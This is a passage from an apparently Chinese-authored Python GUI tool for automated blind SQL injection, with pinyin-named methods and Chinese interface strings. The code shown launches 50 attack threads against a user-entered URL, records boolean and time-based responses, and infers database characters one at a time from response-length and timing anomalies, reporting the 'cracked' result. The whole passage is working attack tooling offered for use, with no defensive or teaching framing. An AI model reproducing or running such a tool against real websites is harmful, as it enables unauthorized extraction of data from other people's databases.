                                self.bao_po_zi_fu[wei_zhi] = zi_fu
                                self.que_ren_zi_fu[wei_zhi] = zi_fu
                                
                                self.zhu_chuang_kou.after(0, self.geng_xin_bao_po_jie_guo)
                            else:
                                self.fen_xi_xiang_ying_chang_du(wei_zhi)
                                
                                self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} - 位置 {wei_zhi} 尝试字符 '{zi_fu}' - 响应时间: {xiang_ying_shi_jian:.2f}秒")
                        else:
                            if jie_guo["xiang_ying_shi_jian"] > 2.0:
                                self.ji_lu_xiao_xi(f"[可能成功] 线程 {jie_guo['xian_cheng_ID']} - Payload: {jie_guo['zai_he']} - 响应时间: {jie_guo['xiang_ying_shi_jian']:.2f}秒")
                            else:
                                self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} - Payload: {jie_guo['zai_he']} - 响应时间: {jie_guo['xiang_ying_shi_jian']:.2f}秒")
                    
                    else:
                        if "wei_zhi" in jie_guo and "zi_fu" in jie_guo:
                            wei_zhi = jie_guo['wei_zhi']
                            zi_fu = jie_guo['zi_fu']
                            xiang_ying_chang_du = jie_guo['xiang_ying_chang_du']
                            
                            if wei_zhi not in self.xiang_ying_chang_du_zi_dian:
                                self.xiang_ying_chang_du_zi_dian[wei_zhi] = {}
                            
                            self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu] = xiang_ying_chang_du
                            
                            self.fen_xi_xiang_ying_chang_du(wei_zhi)
                            
                            if "success" in jie_guo["xiang_ying_wen_ben"].lower() or "admin" in jie_guo["xiang_ying_wen_ben"].lower():
                                self.ji_lu_xiao_xi(f"[可能成功] 线程 {jie_guo['xian_cheng_ID']} - 位置 {wei_zhi} 的字符是 '{zi_fu}' - 响应长度: {xiang_ying_chang_du}")
                                self.bao_po_zi_fu[wei_zhi] = zi_fu
                                self.que_ren_zi_fu[wei_zhi] = zi_fu
                                self.zhu_chuang_kou.after(0, self.geng_xin_bao_po_jie_guo)
                            else:
                                self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} - 位置 {wei_zhi} 尝试字符 '{zi_fu}' - 响应长度: {xiang_ying_chang_du}")
                        else:
                            self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} - Payload: {jie_guo['zai_he']} - 状态码: {jie_guo['zhuang_tai_ma']} - 响应长度: {jie_guo['xiang_ying_chang_du']}")
                
                self.jie_guo_dui_lie.task_done()
                
            except queue.Empty:
                time.sleep(0.01)
            except Exception as yi_chang:
                print(f"处理结果错误: {yi_chang}")
                time.sleep(0.01)
        
        if not self.gong_ji_yun_xing_zhong:
            self.geng_xin_zhuang_tai("攻击已停止")
            self.kai_shi_an_niu.config(state=tk.NORMAL)
            self.ting_zhi_an_niu.config(state=tk.DISABLED)
            
            if self.gong_ji_kai_shi_shi_jian > 0:
                self.gong_ji_hao_shi = time.time() - self.gong_ji_kai_shi_shi_jian
                self.ji_lu_xiao_xi(f"攻击耗时: {self.gong_ji_hao_shi:.2f}秒")
            
            if self.bao_po_zi_fu:
                self.zhu_chuang_kou.after(100, self.geng_xin_bao_po_jie_guo)
                self.ji_lu_xiao_xi("="*50)
                self.ji_lu_xiao_xi(f"最终爆破结果: {self.zui_zhong_jie_guo}")
                if self.gong_ji_hao_shi > 0:
                    self.ji_lu_xiao_xi(f"总耗时: {self.gong_ji_hao_shi:.2f}秒")
                self.ji_lu_xiao_xi("="*50)
                self.zhu_chuang_kou.after(200, lambda: messagebox.showinfo("爆破完成", f"爆破结果: {self.zui_zhong_jie_guo}\n总耗时: {self.gong_ji_hao_shi:.2f}秒"))
    
    def kai_shi_gong_ji(self):
        mu_biao_wang_zhi = self.wang_zhi_shu_ru_kuang.get().strip()
        if not mu_biao_wang_zhi:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        self.bao_po_zi_fu = {}
        self.que_ren_zi_fu = {}
        self.zui_zhong_jie_guo = ""
        self.bao_po_jie_guo_bian_liang.set("等待爆破...")
        
        self.gong_ji_kai_shi_shi_jian = time.time()
        self.gong_ji_hao_shi = 0
        
        zhu_ru_dian = self.zhu_ru_dian_bian_liang.get()
        gong_ji_lei_xing = self.gong_ji_lei_xing_bian_liang.get()
        xian_cheng_shu = 50
        yan_chi = self.yan_chi_bian_liang.get()
        zai_he = self.zai_he_wen_ben_kuang.get(1.0, tk.END).strip()
        
        if yan_chi < 0.05 and gong_ji_lei_xing == "布尔盲注":
            yan_chi = 0.05
            self.ji_lu_xiao_xi("注意: 设置最小延迟为0.05秒以确保结果准确性")
        
        try:
            qi_shi_wei_zhi = self.qi_shi_wei_zhi_bian_liang.get()
            jie_shu_wei_zhi = self.jie_shu_wei_zhi_bian_liang.get()
            
            if qi_shi_wei_zhi < 1:
                messagebox.showerror("错误", "起始位置必须大于等于1")
                return
                
            if jie_shu_wei_zhi < qi_shi_wei_zhi:
                messagebox.showerror("错误", "结束位置必须大于等于起始位置")
                return
        except:
            messagebox.showerror("错误", "请输入有效的爆破位数范围")
            return
        
        if not zai_he:
            messagebox.showerror("错误", "请输入Payload")
            return
        
        self.gong_ji_yun_xing_zhong = True
        self.kai_shi_an_niu.config(state=tk.DISABLED)
        self.ting_zhi_an_niu.config(state=tk.NORMAL)
        self.geng_xin_zhuang_tai(f"正在使用 50 个线程进行攻击...")
        
        self.xian_cheng_lie_biao = []
        
        self.ji_lu_xiao_xi(f"开始攻击 - URL: {mu_biao_wang_zhi}, 注入点: {zhu_ru_dian}, 攻击类型: {gong_ji_lei_xing}, 线程数: 50, 爆破位数范围: {qi_shi_wei_zhi}-{jie_shu_wei_zhi}")
        
        for i in range(xian_cheng_shu):
            xian_cheng = threading.Thread(
                target=self.gong_zuo_xian_cheng,
                args=(i+1, mu_biao_wang_zhi, zhu_ru_dian, gong_ji_lei_xing, zai_he, yan_chi, qi_shi_wei_zhi, jie_shu_wei_zhi, xian_cheng_shu),
                daemon=True
            )
            self.xian_cheng_lie_biao.append(xian_cheng)
            xian_cheng.start()
            self.ji_lu_xiao_xi(f"线程 {i+1} 已启动")
        
        jie_guo_chu_li_xian_cheng = threading.Thread(target=self.chu_li_jie_guo, daemon=True)
        jie_guo_chu_li_xian_cheng.start()
    
    def fen_xi_xiang_ying_chang_du(self, wei_zhi):
        if wei_zhi not in self.xiang_ying_chang_du_zi_dian or len(self.xiang_ying_chang_du_zi_dian[wei_zhi]) < 5:
            return
            
        chang_du_zi_dian = self.xiang_ying_chang_du_zi_dian[wei_zhi]
        
        chang_du_ji_shu = {}
        for zi_fu, chang_du in chang_du_zi_dian.items():
            if chang_du not in chang_du_ji_shu:
                chang_du_ji_shu[chang_du] = []
            chang_du_ji_shu[chang_du].append(zi_fu)
        
        self.xiang_ying_chang_du_tong_ji[wei_zhi] = chang_du_ji_shu
        
        fen_xi_xin_xi = f"位置 {wei_zhi} 的响应长度分布:\n"
        for chang_du, zi_fu_lie_biao in sorted(chang_du_ji_shu.items()):
            fen_xi_xin_xi += f"  长度 {chang_du}: {len(zi_fu_lie_biao)}个字符 {','.join(zi_fu_lie_biao[:5])}{'...' if len(zi_fu_lie_biao) > 5 else ''}\n"
        
        wei_yi_chang_du_zi_fu = []
        for chang_du, zi_fu_lie_biao in chang_du_ji_shu.items():
            if len(zi_fu_lie_biao) == 1 and len(chang_du_zi_dian) > 5:
                wei_yi_chang_du_zi_fu.extend(zi_fu_lie_biao)
                self.bao_po_zi_fu[wei_zhi] = zi_fu_lie_biao[0]
                self.que_ren_zi_fu[wei_zhi] = zi_fu_lie_biao[0]
                self.ji_lu_xiao_xi(f"[响应长度分析] 位置 {wei_zhi} 的字符 '{zi_fu_lie_biao[0]}' 响应长度 {chang_du} 与其他字符不同，可能是正确字符")
                self.zhu_chuang_kou.after(0, self.geng_xin_bao_po_jie_guo)
                break
        
        if not wei_yi_chang_du_zi_fu and len(chang_du_ji_shu) > 1:
            chang_du_lie_biao = list(chang_du_ji_shu.keys())
            chang_du_lie_biao.sort()
            
            ping_jun_chang_du = sum(chang_du_lie_biao) / len(chang_du_lie_biao)
            biao_zhun_cha = (sum((l - ping_jun_chang_du) ** 2 for l in chang_du_lie_biao) / len(chang_du_lie_biao)) ** 0.5
            
            for chang_du, zi_fu_lie_biao in chang_du_ji_shu.items():
                if abs(chang_du - ping_jun_chang_du) > 2 * biao_zhun_cha and len(zi_fu_lie_biao) <= 3:
                    self.bao_po_zi_fu[wei_zhi] = zi_fu_lie_biao[0]
                    self.que_ren_zi_fu[wei_zhi] = zi_fu_lie_biao[0]
                    self.ji_lu_xiao_xi(f"[响应长度分析] 位置 {wei_zhi} 的字符 '{zi_fu_lie_biao[0]}' 响应长度 {chang_du} 明显不同，可能是正确字符")
                    self.zhu_chuang_kou.after(0, self.geng_xin_bao_po_jie_guo)
                    break
        
        if not wei_yi_chang_du_zi_fu and len(chang_du_ji_shu) > 2:
            an_zi_fu_shu_pai_xu = sorted(chang_du_ji_shu.items(), key=lambda x: len(x[1]))
            if len(an_zi_fu_shu_pai_xu[0][1]) <= 3 and len(an_zi_fu_shu_pai_xu[1][1]) > 5:
                chang_du, zi_fu_lie_biao = an_zi_fu_shu_pai_xu[0]
                self.bao_po_zi_fu[wei_zhi] = zi_fu_lie_biao[0]
                self.ji_lu_xiao_xi(f"[响应长度分析] 位置 {wei_zhi} 的字符 '{zi_fu_lie_biao[0]}' 所在响应长度组 {chang_du} 字符数量明显较少，可能是正确字符")
                self.zhu_chuang_kou.after(0, self.geng_xin_bao_po_jie_guo)
        
        if len(chang_du_zi_dian) % 10 == 0 and len(chang_du_zi_dian) > 0:
            self.ji_lu_xiao_xi(fen_xi_xin_xi)
    
    def geng_xin_bao_po_jie_guo(self):
        qi_shi_wei_zhi = self.qi_shi_wei_zhi_bian_liang.get()
        jie_shu_wei_zhi = self.jie_shu_wei_zhi_bian_liang.get()
        
        jie_guo = ""
        ge_shi_hua_jie_guo = ""
        
        for wei_zhi in range(qi_shi_wei_zhi, jie_shu_wei_zhi + 1):
            wei_zhi_biao_ji = f"[{wei_zhi}]"
            
            if wei_zhi in self.que_ren_zi_fu:
                zi_fu = self.que_ren_zi_fu[wei_zhi]
                jie_guo += zi_fu
                chang_du_xin_xi = ""
                if hasattr(self, 'xiang_ying_chang_du_zi_dian') and wei_zhi in self.xiang_ying_chang_du_zi_dian and zi_fu in self.xiang_ying_chang_du_zi_dian[wei_zhi]:
                    if self.gong_ji_lei_xing_bian_liang.get() == "时间盲注":
                        chang_du_xin_xi = f"({self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu]:.2f}秒)"
                    else:
                        chang_du_xin_xi = f"({self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu]}字节)"
                ge_shi_hua_jie_guo += f"{wei_zhi_biao_ji}{zi_fu}{chang_du_xin_xi} "
            elif wei_zhi in self.bao_po_zi_fu:
                zi_fu = self.bao_po_zi_fu[wei_zhi]
                jie_guo += zi_fu
                chang_du_xin_xi = ""
                if hasattr(self, 'xiang_ying_chang_du_zi_dian') and wei_zhi in self.xiang_ying_chang_du_zi_dian and zi_fu in self.xiang_ying_chang_du_zi_dian[wei_zhi]:
                    if self.gong_ji_lei_xing_bian_liang.get() == "时间盲注":
                        chang_du_xin_xi = f"({self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu]:.2f}秒)"
                    else:
                        chang_du_xin_xi = f"({self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu]}字节)"
                ge_shi_hua_jie_guo += f"{wei_zhi_biao_ji}{zi_fu}{chang_du_xin_xi} "
            else:
                jie_guo += "*"
                ge_shi_hua_jie_guo += f"{wei_zhi_biao_ji}* "
        
        self.zui_zhong_jie_guo = jie_guo
        
        hao_shi_xin_xi = ""
        if self.gong_ji_kai_shi_shi_jian > 0:
            dang_qian_hao_shi = time.time() - self.gong_ji_kai_shi_shi_jian if self.gong_ji_yun_xing_zhong else self.gong_ji_hao_shi
            hao_shi_xin_xi = f"\n总耗时: {dang_qian_hao_shi:.2f}秒"
        
        if jie_guo:
            self.bao_po_jie_guo_bian_liang.set(f"最终爆破结果: {jie_guo}{hao_shi_xin_xi}")
            self.bao_po_jie_guo_biao_qian.config(bg="#e8f5e9", fg="#2e7d32", 
                                           font=("Consolas", 12, "bold"),
                                           relief=tk.GROOVE, borderwidth=2)
            
            if len(self.bao_po_zi_fu) % 3 == 0:
                self.ji_lu_xiao_xi(f"[进度] 当前已爆破 {len(self.bao_po_zi_fu)} 个字符: {jie_guo}\n总耗时: {dang_qian_hao_shi:.2f}秒")
        else:
            self.bao_po_jie_guo_bian_liang.set("等待爆破...")
            self.bao_po_jie_guo_biao_qian.config(bg="#f5f5f5", fg=self.wen_ben_se, 
                                           font=("Consolas", 12),
                                           relief=tk.FLAT, borderwidth=1)
            
        if jie_guo and (len(self.bao_po_zi_fu) % 3 == 0 or len(self.bao_po_zi_fu) == 1):
            self.ji_lu_xiao_xi(f"当前爆破进度: {jie_guo}\n总耗时: {dang_qian_hao_shi:.2f}秒")
        
        self.zhu_chuang_kou.update_idletasks()
    
    def ting_zhi_gong_ji(self):
        self.gong_ji_yun_xing_zhong = False
        self.geng_xin_zhuang_tai("正在停止攻击...")
        self.ji_lu_xiao_xi("正在停止所有线程...")
        
        if self.gong_ji_kai_shi_shi_jian > 0:
            self.gong_ji_hao_shi = time.time() - self.gong_ji_kai_shi_shi_jian
            self.ji_lu_xiao_xi(f"攻击耗时: {self.gong_ji_hao_shi:.2f}秒")
            
            if self.zui_zhong_jie_guo:
                self.bao_po_jie_guo_bian_liang.set(f"最终爆破结果: {self.zui_zhong_jie_guo}\n总耗时: {self.gong_ji_hao_shi:.2f}秒")
                self.bao_po_jie_guo_biao_qian.config(bg="#e8f5e9", fg="#2e7d32", 
                                               font=("Consolas", 12, "bold"),
                                               relief=tk.GROOVE, borderwidth=2)
        
        self.kai_shi_an_niu.config(state=tk.NORMAL)
        self.ting_zhi_an_niu.config(state=tk.DISABLED)
        
        if self.bao_po_zi_fu:
            self.geng_xin_bao_po_jie_guo()
            
            ge_shi_hua_jie_guo = ""
            for i in range(len(self.zui_zhong_jie_guo)):
                ge_shi_hua_jie_guo += self.zui_zhong_jie_guo[i]
                if i < len(self.zui_zhong_jie_guo) - 1:
                    ge_shi_hua_jie_guo += ","
            
            self.ji_lu_xiao_xi("="*50)
            self.ji_lu_xiao_xi(f"最终爆破结果: {self.zui_zhong_jie_guo}")
            self.ji_lu_xiao_xi(f"格式化结果: {ge_shi_hua_jie_guo}")
            self.ji_lu_xiao_xi("="*50)
            messagebox.showinfo("爆破完成", f"爆破结果: {self.zui_zhong_jie_guo}\n格式化结果: {ge_shi_hua_jie_guo}")

if __name__ == "__main__":
    zhu_chuang_kou = tk.Tk()
    ying_yong = SQLZhuRuGongJu(zhu_chuang_kou)
    zhu_chuang_kou.mainloop()